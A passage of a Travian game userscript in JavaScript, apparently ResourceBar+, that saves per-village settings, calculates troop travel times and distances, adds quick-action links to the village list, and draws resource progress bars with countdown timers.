			RB[contentCookie][j] = cookieValue[j+sI] == undefined ? 0: cvT == 0 ? parseInt(cookieValue[j]): unesc(cookieValue[j+sI]);
		}
	} else for( var j = 0; j < RB[contentCookie].length; j++ ) RB[contentCookie][j] = 0;
}

function loadZVCookie ( nameCoockie, contentCookie, vID ) {
	var cvID = vID || village_aid;
	loadVCookie ( nameCoockie, contentCookie, vID, 1 );
	if( RB[contentCookie].length == 0 ) RB[contentCookie][0] = 0;
}

function saveVCookie ( nameCoockie, contentCookie, cType ) {
	var newCookie = '';
	var cvT = cType || 0;
	var oldCookie = RB_getValue(GMcookieID + nameCoockie,'');
	for( var i = 0; i < villages_count; i++ ) {
		newCookie += villages_id[i] + cookieDelim[cvT][1];
		if( villages_id[i] == village_aid ) {
			if( cvT == 1 ) newCookie += contentCookie.length + cookieDelim[cvT][1];
			for( var j = 0; j < contentCookie.length; j++ ) {
				if( contentCookie[j] !== undefined ) newCookie += esc(contentCookie[j]) + cookieDelim[cvT][1];
			}
		} else {
			var Rej = new RegExp("(" + villages_id[i] + cookieDelim[cvT][0]);
			var oldOneCookie = oldCookie.match(Rej);
			if( oldOneCookie != undefined ) newCookie += oldOneCookie[2];
		}
		newCookie += cookieDelim[cvT][2];
	}
	RB_setValue(GMcookieID + nameCoockie, newCookie);
}

function saveCookie ( nameCoockie, contentCookie ) {
	var newCookie = '';
	for( var j = 0; j < RB[contentCookie].length; j++ ) newCookie += RB[contentCookie][j] + '@_';
	RB_setValue(GMcookieID + nameCoockie, newCookie);
}

function loadCookie ( nameCoockie, contentCookie ) {
	var RCookie = RB_getValue(GMcookieID + nameCoockie,'');
	if( RCookie != '' ) {
		var cookieValue = RCookie.split('@_');
		for( var j = 0; j < RB[contentCookie].length; j++ )
			if( cookieValue[j] !== undefined ) if( cookieValue[j].length > 0 ) RB[contentCookie][j] = cookieValue[j];
	}
}

function saveOVCookie ( nameCoockie, contentCookie ) {
	var newCookie = '';
	for( var i = 0; i < villages_id.length; i++ )
		if( contentCookie[villages_id[i]] !== undefined )
		if( contentCookie[villages_id[i]].length > 0 )
			newCookie += villages_id[i] + cookieDelim[1][1] + esc(contentCookie[villages_id[i]]) + cookieDelim[1][2];
	RB_setValue(GMcookieID + nameCoockie, newCookie);
}

function saveODCookie ( nameCoockie, contentCookie ) {
	var newCookie = '';
	for( var i = 0; i < linkVSwitch.length; i++ ) {
		var nd = parseInt(linkVSwitch[i].match(/newdid=(\d+)/)[1]);
		if( contentCookie[nd] !== undefined )
			newCookie += nd + cookieDelim[1][1] + contentCookie[nd] + cookieDelim[1][2];
	}
	RB_setValue(GMcookieID + nameCoockie, newCookie);
}

function loadOVCookie ( nameCoockie, contentCookie ) {
	var RCookie = RB_getValue(GMcookieID + nameCoockie,'');
	var oneCookie = [];
	var cCount = 0;
	var Rej = new RegExp("(\\d+" + cookieDelim[1][0], 'g');
	while ((oneCookie = Rej.exec(RCookie)) != null) { RB[contentCookie][oneCookie[1]] = unesc(oneCookie[2]); cCount++; }
	return cCount;
}

function loadAllCookie () {
	loadVCookie ( 'Dorf2', 'village_Dorf2' );
	loadVCookie ( 'VV', 'village_Var' );
	loadCookie ( 'OV', 'overview' );
	loadCookie ( 'Mem', 'wantsMem' );
	loadCookie ( 'DictTR', 'dictTR' );
	loadCookie ( 'AS', 'serversAN' );

	if( lMap != '' && lMap != RB.dictionary[15] ) { RB.dictionary[15] = lMap; saveCookie( 'Dict', 'dictionary' ); }
//	if( ! /^1\.6\./.test(RB.Setup[0]) ) RB.Setup = RB.dSetup.slice(); else RB.Setup[0] = version;
}

/************************* distance calculation ***************************/

var TTime = [
	[19, [24]], // Theutates Thunder
	[17, [23]], // Pathfinder
	[16, [4,25]], // Equites Legati, Druidrider
	[14, [5]], // Equites Imperatoris
	[13, [26]], // Haeduan
	[10, [6,15]], // Equites Caesaris, Paladin
	[9, [14,16]], // Scout
	[7, [3,11,12,21]], // Imperian, Clubswinger, Spearman, Phalanx
	[6, [1,13,22]], // Legionnaire, Axeman, Swordsman
	[5, [2,10,20,29,30]], // Praetorian, Settler, Chieftain
	[4, [7,9,17,19,27]], // Battering Ram, Senator, Ram, Chief, Ram
	[3, [8,18,28]] // Fire Catapult, Catapult, Trebuchet
	];
var MTime = [16, 12, 24];

function showAllTTime ( vType, tVil, arena, art, shoes ) {
	function appendTTime ( htt ) {
		var htg = formatTime(htt, 0);
		newTR.appendChild($c(htg));
		return htt;
	}
	function appendTime () {
		htf = absTime( ht );
		timerP[t] = new Object();
		timerP[t].time = htf;
		timerP[t].obj = $c(formatTime(htf, 1));
		newTR.appendChild(timerP[t++].obj);
		newTABLE.appendChild(newTR);
	}

	var artefact = art || RB.Setup[3];
	var shK = shoes || 0;
	var newTABLE = $e('TABLE',[['class',allIDs[7]]]);
	var serverTime = getServerTime();
	var tR = vType < 1 ? parseInt(RB.Setup[2]) + 1: 0; //troop race

	var t = lastTimerP[0];
	timerP.length = t;
	if( typeof(tVil) != 'object' ) {
		var distance = calcDistance(tVil, village_aid);
		if( ver4FL ) {
			var xy = id2xy(tVil);
			var nL = $a(printCoords(tVil),[['href','position_details.php?x='+xy[0]+'&y='+xy[1]],['style','color:#252525;']]);
		} else
			var nL = $a(printCoords(tVil),[['href','karte.php?z='+tVil],['style','color:#252525;']]);
		nL.appendChild($e('SPAN',[['class',allIDs[29]]]));
		var newTR = $ee('TR',$c(nL,[['style','font-weight:bold;direction:'+coordDir+';']]));
	} else {
		var distance = calcDistance(tVil[0], tVil[1]);
		var newTR = $ee('TR',$c('----'));
	}
	newTR.appendChild($c(' &lt;-&gt; ' + parseFloat(distance.toFixed(2)),[['colspan',(tR > 0 ? 2:4)]]));
	newTABLE.appendChild(newTR);

	if( distance > 0 ) {
		if( sK == 0 ) {
			sK = troopInfo(1,7) != 0 ? troopInfo(1,7)/6: 1;
		}
		if( vType < 2 ) {
			var newTR = $e('TR');
			var ht = appendTTime( getTTime( distance, MTime[parseInt(RB.Setup[2])]*sM, 0, 0) );
			var attr = vType < 1 ? undefined : [['colspan',3]];
			newTR.appendChild($c(trImg(allIDs[33],RB.dictionary[2]),attr));
			appendTime();
		}
		if( vType > -1 ) {
			if( ver4FL ) {
				var newTR = $e('TR');
				var ht = appendTTime( getTTime( distance, RB.dictFL[19], arena, 0) );
				var attr = vType < 1 ? undefined : [['colspan',3]];
				newTR.appendChild($c(trImg('unit uhero'),attr));
				appendTime();
			}
			for( var i = 0; i < TTime.length; i++ ) {
				var newTR = $e('TR');
				var ht = appendTTime( getTTime( distance, TTime[i][0]*sK, arena, parseInt(artefact), shK) );
				var j = 0;
				var fl = tR ? false: true;
				for( var k = 0; k < 3; k++ ) {
					var fl2 = tR ? false: true;
					var newTD = $e('TD');
					while( TTime[i][1][j] < (11+10*k) ) {
						if( Math.ceil((TTime[i][1][j])/10) == tR ) { fl = true; fl2 = true; }
						newTD.appendChild(trImg('unit u' + TTime[i][1][j], RB.dictTR[TTime[i][1][j++]]));
					}
					if( fl2 ) newTR.appendChild(newTD);
				}
				if( fl ) {
					appendTime();
				}
			}
		}
	}
	lastTimerP[1] = t;
	return newTABLE;
}

function distanceTooltipGen(e) {
	makeTooltip(showAllTTime(0, getVid(this.getAttribute('href')), RB.village_Var[1]));
}
function distanceTooltipGen2(e) {
	makeTooltip(showAllTTime(1, getVid(this.getAttribute('href')), RB.village_Var[1]));
}
function distanceTooltip(target, tp) {
	if( ! /[&\?][zd]=\d+|[&\?]x=-?\d+&y=-?\d+/.test(target.getAttribute('href')) ) return;
	if( tp == 0 )
		target.addEventListener("mouseover", distanceTooltipGen, false);
	else
		target.addEventListener("mouseover", distanceTooltipGen2, false);
	target.addEventListener("mouseout", removeTooltip, false);
}

function addShowDistanceIn( ss, vt ) {
	var newP = $g(allIDs[0]);
	if( !(newP) ) newP = $e('DIV',[['style','float:'+docDir[1]+';'],['id',allIDs[0]]]);
	ss.parentNode.insertBefore(newP, ss);
	$gn('x')[0].addEventListener('keyup', function() { showDistanceIn( vt ) }, false);
	$gn('y')[0].addEventListener('keyup', function() { showDistanceIn( vt ) }, false);
	lastTimerP[2] = lastTimerP[0];
	showDistanceIn( vt );
}

var distInVilage = new Object;
var distInVilageFL = true;
function showDistanceIn ( vt ) { // travel time
	var dd = $g(allIDs[0]);
	if( ! dd ) return;
	var dX = parseInt($gn('x')[0].value);
	var dY = parseInt($gn('y')[0].value);
	var ddd = dd.firstChild;
	if( ddd ) dd.removeChild(ddd);
	lastTimerP[0] = lastTimerP[2];
	var xy = $g(allIDs[29]);
	if( xy ) xy.parentNode.removeChild(xy);
	if( isNaN(dX) || isNaN(dY) ) return;
	xy = xy2id(dX, dY);
	dd.appendChild(showAllTTime(vt,xy,RB.village_Var[1]));
	lastTimerP[2] = lastTimerP[0];
	lastTimerP[0] = lastTimerP[1];
	RB_setValue(GMcookieID + 'next', xy);
	if( distInVilageFL ) {
		var vLinks = $xf(vLinksPat,'l');
		for ( var vn = 0; vn < vLinks.snapshotLength; vn++ )
			distInVilage[villages_id[vn]] = vLinks.snapshotItem(vn).innerHTML;
		distInVilageFL = false;
	}
	ddd = ver4FL ? $gn('y')[0].parentNode.parentNode: $gn('y')[0].parentNode;
	if( typeof distInVilage[xy] != 'undefined' ) {
		ddd.appendChild($ee('SPAN',distInVilage[xy],[['style','margin:0px 5px;font-size:12px;'],['id',allIDs[29]]]));
	} else {
		var ht = getVTip(xy);
		if( ht != '' ) {
			ddd.appendChild($ee('SPAN',ht,[['style','color:'+vHColor+';margin:0px 5px;font-size:12px;'],['id',allIDs[29]]]));
		}
	}
}

/************************* other ****************************/

function incomeResourcesInRP () {
	all_moving = 0;
//	if( ver4FL ) setInterval(incomeResourcesInRP34, 1000);
	/*else*/ incomeResourcesInRP34();
}

var all_moving = 0;
function incomeResourcesInRP34 () {
	var townTables = $xf('.//table[.//td[@class="role"]/a]','l',cont);
	resourceCalculatorInit();
	if( all_moving == townTables.snapshotLength ) return; else all_moving = townTables.snapshotLength;
	for ( var i=0 ; i < townTables.snapshotLength; i++ ){
		var ttable = townTables.snapshotItem(i);
		var vID = $xf('thead/tr/td[@class="role"]/a', 'f', ttable).getAttribute('href').match(/d=(\d+)/)[1];
		if( vID != village_aid && ! ver4FL )
			$xf('tbody[@class="units"]/tr/th', 'f', ttable).innerHTML += ' <span style="white-space:nowrap;">'+printCoords(vID)+'</span>';
		var mLinks = $xf('tbody/tr/td/div[@class="res"]', 'f', ttable);
		if( mLinks && RB.Setup[10] > 0 ) {
			var timeToGo = toSeconds($xf('tbody/tr/td/div/span[contains(@id, "timer")]','f',ttable).innerHTML);
			var incomingRes = mLinks.innerHTML.match( />\s*?(\d+)/g );
			if( incomingRes ) resourceCalculator( ttable, timeToGo, incomingRes );
		}
	}
	if( RB.Setup[10] > 1 && rpCount > 0 ) resourceCalculatorSumm(townTables.snapshotItem(0), timeToGo);
	if( RB.Setup[10] > 2 && rpCount > 0 ) redLinesSumm(townTables.snapshotItem(0));

//	if( ver4FL ) { addSpeedAndRTSend();	calcAllTrops(); if(stopRPFL) stopRP(); }
}

function addARLinks(myVid, aDirect) {
	var newLinks = $e('span');
	var armStyle = aDirect == 0 ? allIDs[34]: allIDs[35];
	var a2bUrl = RB.dictFL[23] == 0 ? 'a2b.php?z=': 'build.php?id=39&tt=2&z=';
	var ref = $ee('a',trImg(armStyle),[['href',a2bUrl + myVid],['onClick','return false;']]);
	ref.addEventListener('click', function(x) { return function() { sendArmy(x); }}(myVid), false);
	newLinks.appendChild(ref);
	if( aDirect < 2 ) {
		var ref = $ee('a',trImg(allIDs[33]),[['href','build.php?z=' + myVid + '&gid=17' +(RB.dictFL[23]==0?'':'&t=5')],['onClick','return false;']]);
		ref.addEventListener('click', function(x) { return function() { sendResourses(x); }}(myVid), false);
		newLinks.appendChild(ref);
	}
	return newLinks;
}

function sendResTropAdd ( aLink, aType ) {
	if( RB.Setup[15] == 0 ) return;
	var vId = getVid(aLink.getAttribute('href'));
	if( vId == village_aid || vId == 0 ) return;
	insertAfter(addARLinks(vId, aType),aLink);
}

// begin Quick actions to my other villages

function vlist_addButtonsT4 () {
	villages_count = loadOVCookie('vList', 'vList');
	var flNew = false;
	var vLink = [];
	var aV = $xf('.//li/a', 'l', $g('villageList'));
	// workaround for T4 "Dinah" p1
	var tt = crtPath.match(/tt=\d+/);
	var ttFL = tt ? true: false;
	// end
	for( var i = 0; i < aV.snapshotLength; i++ ) {
		linkVSwitch[i] = aV.snapshotItem(i).getAttribute('href');
		// workaround for T4 "Dinah" p2
		if( ttFL && aV.snapshotItem(i).href.indexOf(tt[0]) == -1 )
			aV.snapshotItem(i).href += "&"+tt;
		// end
		var nd = parseInt(linkVSwitch[i].match(/newdid=(\d+)/)[1]);
		if( RB.vList[nd] === undefined ) flNew = true;
		else {
			villages_id[i] = RB.vList[nd];
			if( /active/.test(aV.snapshotItem(i).getAttribute('class')) ) {
				village_aid = villages_id[i];
				village_aNum = i;
			}
			linkHint(aV.snapshotItem(i), villages_id[i]);
		}
	}
	if( villages_count != aV.snapshotLength ) flNew = true;
	if( flNew ) {
		linkVSwitch.length = 0;
		RB.vList.length = 0;
		var ad = $ee('div',httpGet(fullName +'spieler.php?uid='+userID),[['style','display:none;']]);
		var aVB = $xf('.//div[@id="villageList"]//div[@class="list"]/ul/li/a[@title]', 'l', ad);
		lMap = $xf('.//li[@id="n3"]/a', 'f', ad).getAttribute('title');
		ad = null;
		villages_count = aVB.snapshotLength;
		for( var i = 0; i < villages_count; i++ ) {
			var nd = aVB.snapshotItem(i).getAttribute('title');
			did = getVidFromCoords(nd);
			linkVSwitch[i] = aVB.snapshotItem(i).getAttribute('href');
			var nd = parseInt(linkVSwitch[i].match(/newdid=(\d+)/)[1]);
			RB.vList[nd] = did;
			villages_id[i] = did;
		}
		saveODCookie('vList', RB.vList);
	}
	if( RB.Setup[21] != 2 && RB.Setup[15] > 0 ) {
		for( var i=0; i<villages_count; i++) {
			var newAR = addARLinks(villages_id[i],0);
			newAR.setAttribute('class',allIDs[48]);
			aV.snapshotItem(i).parentNode.appendChild(newAR);
		}
	}
	if( RB.Setup[21] > 0 ) {
		var vilT = $e('TABLE',[['id',"vlist"],['style','background-color:white']]);
		var vilB = $e('TBODY');
		if( RB.bodyH[1] == 1 ) $at(vilB,[['style','display:none']]);
		var hideP = imgHide(1);
		hideP.addEventListener('click', function (x) { return function() { bodyHide(x); }}([vilB,1,hideP]), false);
		vilT.appendChild($ee('THEAD',$em('TR',[$c(hideP),$c($gt('A',$g('villageList'))[0].cloneNode(true),[['colspan',2]]),$c('('+villages_count+')')])));
		for( var i=0; i<villages_count; i++) {
			vLink[i] = aV.snapshotItem(i).cloneNode(true);
			var cl = villages_id[i]==village_aid?"dot hl":"dot";
			vilB.appendChild($em('TR',[$c('&#x25CF;',[['class',cl]]),$c($ee('DIV',vLink[i])),$c($a(printCoords(villages_id[i]),[['href',linkVSwitch[i]]]),[['style','direction:'+coordDir+';']]),$c(addARLinks(villages_id[i],0))]));
		}
		vilT.appendChild(vilB);
		if( RB.Setup[21] == 1 ) makeFloatD(vilT,7);
		if( RB.Setup[21] == 2 ) {
			var xy = offsetPosition( $g("villageList") );
			makeFloat(vilT,(ltr?xy[0]-10:10),xy[1]+15);
		}
	}
}

function vlist_addButtonsT4n () {
	var vlist = $g("sidebarBoxVillagelist");
	if ( vlist ) {
		var villages = $gt('li',vlist);
		for ( var vn = 0; vn < villages.length; vn++ ) {
			var linkEl = $gt("a",villages[vn])[0];
			linkVSwitch[vn] = linkEl.getAttribute('href');
			var myVid = getVidFromCoords(linkEl.innerHTML);
			villages_id[vn] = myVid;

			if( linkEl.getAttribute('class').match(/active/i) ) {
				village_aid = myVid; village_aNum = vn;
			}
			linkHint($gt('div',linkEl)[0], myVid);
			villages_count++;
			if( RB.Setup[21] != 2 && RB.Setup[15] > 0 ) {
				var newAR = addARLinks(villages_id[vn],0);
				newAR.setAttribute('class',allIDs[48]);
				insertAfter(newAR,$gt('div',linkEl)[0]);
			}
		}
	} else {
		villages_count = 1;
		villages_id[0] = 0;
	}

	if( RB.Setup[21] > 0 ) {
		var vLink = [];
		var vilT = $e('TABLE',[['id',"vlist"],['style','background-color:white']]);
		var vilB = $e('TBODY');
		if( RB.bodyH[1] == 1 ) $at(vilB,[['style','display:none']]);
		var hideP = imgHide(1);
		hideP.addEventListener('click', function (x) { return function() { bodyHide(x); }}([vilB,1,hideP]), false);
		vilT.appendChild($ee('THEAD',$em('TR',[$c(hideP),$c($gc('boxTitle',$g('sidebarBoxVillagelist'))[0].innerHTML.onlyText(),[['colspan',2],['style','font-weight:bold;']]),$c('('+villages_count+')')])));
		for( var i=0; i<villages.length; i++) {
			vLink[i] = $a($gt("div",villages[i])[0].innerHTML,[['href',linkVSwitch[i]]]);
			var cl = villages_id[i]==village_aid?"dot hl":"dot";
			vilB.appendChild($em('TR',[$c('&#x25CF;',[['class',cl]]),$c($ee('DIV',vLink[i])),$c($a(printCoords(villages_id[i]),[['href',linkVSwitch[i]]]),[['style','direction:'+coordDir+';']]),$c(addARLinks(villages_id[i],0))]));
		}
		vilT.appendChild(vilB);
		if( RB.Setup[21] == 1 ) makeFloatD(vilT,7);
		if( RB.Setup[21] == 2 ) {
			var xy = offsetPosition( $g("sidebarBoxVillagelist") );
			makeFloat(vilT,(ltr?xy[0]-10:10),xy[1]+18);
		}
	}
}

function vlist_addButtons () {
	var vlist = $g("vlist");
	if ( vlist ) {
		var villages = vlist.tBodies[0].rows;
		for ( var vn = 0; vn < villages.length; vn++ ) {
			var getTds = villages[vn].cells;

			var linkEl = $gt("a",getTds[1])[0];
			linkVSwitch[vn] = linkEl.getAttribute('href');
			var myVid = getVidFromCoords(getTds[2].innerHTML);
			villages_id[vn] = myVid;

			if( getTds[0].getAttribute('class').match(/hl/i) ) {
				village_aid = myVid; village_aNum = vn;
			}
			var newTD = $c( addARLinks(myVid,0));
			villages[vn].appendChild(newTD);
			linkHint(linkEl, myVid);
			villages_count++;
		}
		var villages_c = vlist.tHead.rows;
		newTH = $c('(' + villages_count + ')');
		villages_c[0].appendChild(newTH);
	} else {
		villages_count = 1;
		villages_id[0] = 0;
	}
}
// end Quick actions to my other villages

function calculationPPH () {
	var RCookie = RB_getValue(GMcookieID + 'vPPH','0.0.0.0.0./');
	var rows = RCookie.split('\.\/');
	for( var i=0; i < (rows.length-1); i++ ) {
		var cels = rows[i].split(".");
		for ( var j=1; j < 5; j++ ) {
			sumPPH[j-1] += isFinite(parseInt(cels[j])) ? parseInt(cels[j]) :0;
		}
	}
}

var lastColor = [4,4,4,4];

function newStyle(e, j, sp) {
	var color = ( j == 2 && sp ) ? "white" : "black";
	var addCss = "."+ allIDs[16] + e + " div {color: " + color + ";background-color:" + bgcolor[j] + ";float: right;width: 100%;height:18px;margin-top:0px; display:inline;}";
	lastColor[e] = j;
	return addCss;
}

function progressbar_updValues() {
	var ts = Math.round(((new Date().getTime()) - RunTime[4])/1000);
	getResources();
	var addCss = '';
	for (var j = 0; j < 4; j++) {
		var spaceLeft = fullRes[j] - resNow[j];
		var percentUsed2 = resNow[j] / fullRes[j] * 100;
		var percentUsed = Math.round(percentUsed2);

		timerRB[j].pb.setAttribute("style", "width: " + Math.round(percentUsed2 * 2) + "px;");
		timerRB[j].pval.innerHTML = percentUsed + "%";
		if( Math.abs(timerRB[j].time) < ts ) timerRB[j].time = 0;
		if( incomepersecond[j] != 0 ) {
			if( timerRB[j].time != 0 ) {
				timerRB[j].time += incomepersecond[j] > 0 ? -ts: ts;
				timerRB[j].val.innerHTML = formatTime(timerRB[j].time, 0);
			}
		}

		var sp = incomepersecond[j] > 0 ? true:false;
		if( percentUsed < 60 ) sp = false;
		if( timerRB[j].time < parseFloat(RB.Setup[6])*3600 ) {
			if (lastColor[j] != 2) {
				addCss += newStyle(j, 2, sp);
			}
		} else if( timerRB[j].time < parseFloat(RB.Setup[5])*3600 ) {
			if (lastColor[j] != 1) {
				addCss += newStyle(j, 1, sp);
			}
		} else {
			if( lastColor[j] != 0 ) {
				addCss += newStyle(j, 0, sp);
			}
		}


//Start kram89 code heavily modified Serj_LV :)
var idx = ver42FL?[1,2,3,5]:[0,1,2,3];
if( ver4FL && RB.bodyH[0] == 1 ) {
	if( timerN.length < 4 ){
		var resource = Math.floor(incomepersecond[j]*3600);
		timerN[j] = new Object();
		var resoColor = resource < 0 ? 'red':'black';
		timerN[j].resotime = timerRB[j].val.cloneNode(true);
		timerN[j].perreso = $e('span');
		timerN[j].divme1 = $ee('P',
			$em('span',['( ',(ver42FL?'':$em('span',[resource,' '],[['style','color:'+resoColor+';']])),timerN[j].resotime,' ',timerN[j].perreso,')'],
				[['style',"font-size:8pt !important;background-color:white;white-space:nowrap;position:absolute;"+docDir[1]+":0px;"]]),
			[['style','position:relative;top:9px;'+docDir[1]+':0px;']]);
		$gt('li',$g(ver42FL?'stockBar':'res'))[idx[j]].appendChild(timerN[j].divme1);
	}

	timerN[j].resotime.innerHTML = formatTime(timerRB[j].time,0);
	timerN[j].perreso.innerHTML = percentUsed+' %';

	function changeColor (obj,color) {
		if( timerN[j][obj+'_color'] != color ) {
			timerN[j][obj+'_color'] != color;
			timerN[j][obj].setAttribute('style','color:'+color+';');
		}
	}

	if( percentUsed < 50 ){
		changeColor('perreso','blue');
	} else if( parseInt(percentUsed) < 70 ){
		changeColor('perreso','#FF6600');
	} else if( parseInt(percentUsed) > 80 ){
		changeColor('perreso','red');
	}

	if( timerRB[j].time < parseFloat(RB.Setup[6])*3600 ){
		changeColor('resotime','red');
	} else if( timerRB[j].time < parseFloat(RB.Setup[5])*3600 ){
		changeColor('resotime','#9900CC');
	} else {
		changeColor('resotime','green');
	}

} else if( timerN.length != 0 ){
	$g(ver42FL?'stockBar':'res').getElementsByTagName('li')[idx[j]].removeChild(timerN[j].divme1);
	if( j == 3 ) timerN.length = 0;
}
//end code


	}
	if( addCss != '' ) GM_addStyle(addCss);
	for( var i = 0; i < timerP.length; i++ ) {
		timerP[i].time += ts;
		timerP[i].obj.innerHTML = formatTime(timerP[i].time, 1);
	}
	for( var i = 0; i < timerB.length; i++ ) {
		if( Math.abs(timerB[i].time) < ts ) timerB[i].time = 0;
		if( timerB[i].time != 0 ) {
			timerB[i].time += timerB[i].time > 0 ? -ts : ts;
			timerB[i].obj.innerHTML = formatTime(timerB[i].time, (typeof timerB[i].ft == 'undefined')? 0: timerB[i].ft);
		}
	}
	for( var i = 0; i < timerB3.length; i++ ) {
		if( Math.abs(timerB3[i].time) < ts )
			timerB3[i].time = 0;
		else
			timerB3[i].time -= ts;
		if( timerB3[i].time >= 0 ) {
			timerB3[i].obj.innerHTML = formatTime(timerB3[i].time, 3);
			if( timerB3[i].time == 0 ) {
				timerB3[i].obj.style.color = 'red';
				timerB3[i].time--;
				show_alert();
			}
		}
	}
	for( var i = 0; i < timerF.length; i++ ) {
		timerF[i].time += ts;
		timerF[i].obj.innerHTML = formatTime(timerF[i].time, 0);
	}
	for( var i = 0; i < timerOv.length; i++ ) {
		if( Math.abs(timerOv[i].time) < ts ) timerOv[i].time = -timerOv[i].dir;
		if( timerOv[i].time != 0 ) {
			timerOv[i].time += timerOv[i].dir*ts;
			timerOv[i].obj.innerHTML = formatTime(timerOv[i].time, 0);
		}
	}
	RunTime[4] = new Date().getTime();
}

function progressbar_ReInit () {
	for (var j = 0; j < 4; j++)
		if( incomepersecond[j] != 0 ) {
			var spaceLeft = fullRes[j] - resNow[j];
			timerRB[j].time = incomepersecond[j] > 0 ? Math.round(spaceLeft / incomepersecond[j]) : Math.round(resNow[j] / incomepersecond[j]);
			var tTime = absTime(timerRB[j].time);
			var dstr = tTime > 86400 ? (new Date((Math.abs(timerRB[j].time)+getTimeOffset()*3600)*1e3+(new Date().getTime()))).toDateString()+' ':'';
			timerRB[j].val.title = dstr + formatTime(tTime, 2);
		}
}

function progressbar_init() {
	calculationPPH();
	var mm = RB.Setup[22] > 0 ? normalProductionCalc( sumPPH ) : [0,0];
	var ssPPH = 0;

	var tblBody = $e("tbody");
	if( RB.bodyH[0] == 1 ) $at(tblBody,[['style','display:none']]);
	for (var j = 0; j < 4; j++) {
		// creates a table row
		var cellText = $e("div", [["class", allIDs[2]]]);

		timerRB[j] = new Object();
		timerRB[j].pb = $e('div', [['class', allIDs[16] + j]]);
		var fval = $e('DIV');
		fval.appendChild(trImg('r' + (j+1),income[j]));
		timerRB[j].pval = $e('span',[['style','padding:0px 4px;']]);
		fval.appendChild(timerRB[j].pval);

		if( incomepersecond[j] != 0 ) {
			var spaceLeft = fullRes[j] - resNow[j];
			timerRB[j].time = incomepersecond[j] > 0 ? Math.round(spaceLeft / incomepersecond[j]) : Math.round(resNow[j] / incomepersecond[j]);
			timerRB[j].val = $eT('span', timerRB[j].time, 0);
		} else {
			timerRB[j].time = 0;
			timerRB[j].val = $ee('span', '--:--');
		}
		fval.appendChild(timerRB[j].val);

		timerRB[j].pb.appendChild(fval);
		cellText.appendChild(timerRB[j].pb);

		var row = $ee('TR', $c(cellText));

		ssPPH += sumPPH[j]; var sumAttr = [['class',allIDs[11]]];
		if( RB.Setup[22] > 0 ) {
			if( j == mm[0] ) sumAttr.push(['style','color:green;']);
			if( j == mm[1] ) sumAttr.push(['style','color:red;']);
		}
		row.appendChild($c(sumPPH[j],sumAttr));
		tblBody.appendChild(row);
	}

	var alink = $a('ResourceBar+',[['href', '#'],['onClick',jsNone],['title',gtext("overview")]]);
	alink.addEventListener('click', overviewAll, false);
	var alink2 = $a(' v' + version,[['href', namespace],['style','font-size:9px;'],['target','_blank'],['title',gtext("svers")]]);

	var aImg = $e('IMG',[['src',img_pref],['title',gtext("settings")],['style','padding:0px 2px;cursor:pointer;']]);
	aImg.addEventListener('click', rbSetup, false);

	var aImg2 = $e('IMG',[['src',img_notes],['title',gtext("notes")],['style','padding:0px 2px;cursor:pointer;']]);
	aImg2.addEventListener('click', rbNotes, false);

    var alink3 = $a('[M+]', [['href', jsVoid],['style','font-weight:400;'],['title',gtext("res90")]]);
    alink3.addEventListener('click', saveSpaceLeftToMem, false);

	var hideP = imgHide(0);
	hideP.addEventListener('click', function (x) { return function() { bodyHide(x); }}([tblBody,0,hideP]), false);

	var cell = $em('TH',[hideP,alink,alink2,aImg2,aImg,alink3]);

	var pphSpan = $ee('SPAN','&#931;/h',[['title',ssPPH]]);
	pphSpan.addEventListener('click', function (x) { return function() { bodyHide(x); }}([tblBody,0]), false);
	var tblHead = $ee("thead",$em('TR',[cell,$c(pphSpan,[['class',allIDs[12]]])]));

	var tbl = $em('TABLE',[tblHead,tblBody],[['cellspacing', '1'],['cellpadding', '1'],['id', allIDs[1]]]);

	if( RB.Setup[4] == 0 ) {
		$g(pageElem[2]).appendChild($ee('P',tbl));
	} else {
		makeFloatD(tbl, 1);
	}

	progressbar_time = new Date().getTime();
	RunTime[4] = progressbar_time;
	progressbar_updValues();
	progressbar_time = (new Date().getTime()) - progressbar_time;
}

function saveSpaceLeftToMem () {
	if( closeWindowN(10) ) return;

	function resRecalc () {
		nK = parseInt(newPR.value).NaN0();
		for (var i = 0; i < 4; i++) {
			RB.wantsMem[i] = Math.round( fullRes[i]  * nK/100 - resNow[i] );
			if( RB.wantsMem[i] < 0 ) RB.wantsMem[i] = 0;
			ressA[i].innerHTML = RB.wantsMem[i];
		}
	}
	function svOK () {
		saveCookie('Mem', 'wantsMem');
		if( nK > 0 ) {
			RB.dictFL[21] = nK;
			saveCookie( 'DictFL', 'dictFL' );
		}
		closeWindowN(10);
	}

	var nK = RB.dictFL[21];
	if( nK < 1 ) nK = 90;
	var newT = $e('TABLE',[['class',allIDs[7]],['style','background-color:#FAFAFF;']]);
	var newPR = $e('INPUT',[['type', 'TEXT'],['size',2],['maxlength',2],['value',nK]]);
	newPR.addEventListener('keyup', resRecalc, false);
	var btnOK = $ee('BUTTON',gtext("ok"),[['class',allIDs[15]],['onClick',jsNone]]);
	btnOK.addEventListener('click', svOK, true);
	newT.appendChild($em('TR',[$em('TD',[newPR,'%']),$c(btnOK)]));
	var ressA = [];
	RB.wantsMem = [0,0,0,0,village_aid];
	for (var i = 0; i < 4; i++) {
		ressA[i] = $c(RB.wantsMem[i]);
		newT.appendChild($em('TR',[$c(trImg('r' + (i+1))),ressA[i]]));
	}
	resRecalc();
	var xy = offsetPosition(this.parentNode);
	windowID[10] = makeFloat(newT,xy[0]+120,xy[1]+25);
}

function distanceToMyVillages() {
	function updateDistTable () {
		pp.removeChild(attbl);
		lastTimerP[0] = lastTimerP[2];
		attbl = showAllTTime(1, curD, sel.value, sel3.value, shoesT[sel2.value]);
		lastTimerP[0] = lastTimerP[1];
		pp.appendChild(attbl);
	}

	var curD = getVid(crtPath);
	var shoesT = [0,0.25,0.5,0.75];

	var sel = $e('SELECT');
	for( var j = 0; j < 21; j++ ) newOption(sel, j, j);
	var al = RB.Setup[9] == 0 ? RB.village_Var[1] : parseInt(RB.Setup[9]) - 1;
	sel.selected = al; sel.value = al;
	attbl = showAllTTime(1, curD, al);
	lastTimerP[2] = lastTimerP[0];
	lastTimerP[0] = lastTimerP[1];

	var kirURL = $a('(kirilloid.ru)',[['href','http://travian.kirilloid.ru/distance.php#cc='+id2xy(village_aid).join()+','+id2xy(curD).join()+'&srv='+sM+'.'+(ver4FL?'40':'36')],['target','_blank'],['style','font-size:10px;']]);
	var sel2 = $e('SELECT');
	var sO2 = ['-','+25%','+50%','+75%'];
	for( var j = 0; j < sO2.length; j++ ) newOption(sel2, sO2[j], j);
	sel2.selected = 0; sel2.value = 0;
	var t4P = $em('SPAN',[' , ',trImg('itemCategory itemCategory_shoes'),' : ',sel2]);

	var sel3 = $e('SELECT');
